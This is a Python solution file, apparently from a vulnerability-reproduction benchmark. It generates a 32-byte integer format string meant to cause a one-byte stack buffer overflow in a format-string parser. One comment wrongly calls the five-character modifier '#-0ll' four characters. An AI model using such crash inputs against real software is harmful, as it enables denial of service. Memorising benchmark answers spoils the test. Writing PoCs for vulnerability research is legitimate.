import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        # The vulnerability description implies a stack buffer overflow when a program
        # parses a C-style integer format string. The buffer for the format specifier
        # is likely 32 bytes, which is insufficient for some valid 64-bit integer formats.
        #
        # A PoC of length 32 will cause a 1-byte overflow due to the null terminator,
        # which is the minimum required to trigger a sanitizer-detected crash. This is
        # shorter than the ground-truth length of 40, aiming for a better score.
        #
        # The PoC is constructed based on the components mentioned in the description:
        # Format: %[modifier][width].[precision][specifier]
        #
        # - "format modifier (up to 4 characters)": A combination of standard printf flags
        #   and a length specifier like 'll' can create a valid 4-character modifier,
        #   such as '#-0ll'.
        # - "maximum width (up to 19 digits)": This corresponds to the number of
        #   digits in INT64_MAX.
        
        target_len = 32

        # A 4-character modifier composed of standard, valid components.
        modifier = b'#-0ll'
        
        # A 19-digit width, representing the max for a 64-bit signed int.
        width = b'1' * 19
        
        # A standard integer specifier.
        specifier = b'd'
        
        # Calculate the precision length needed to achieve the target PoC length.
        # The total length is the sum of:
        # 1 (for '%') + len(modifier) + len(width) + 1 (for '.') + len(precision) + 1 (for specifier)
        fixed_len = 1 + len(modifier) + len(width) + 1 + len(specifier)
        precision_len = target_len - fixed_len
        
        precision = b'2' * precision_len

        # Assemble the final proof-of-concept payload.
        poc = b'%' + modifier + width + b'.' + precision + specifier
        
        return poc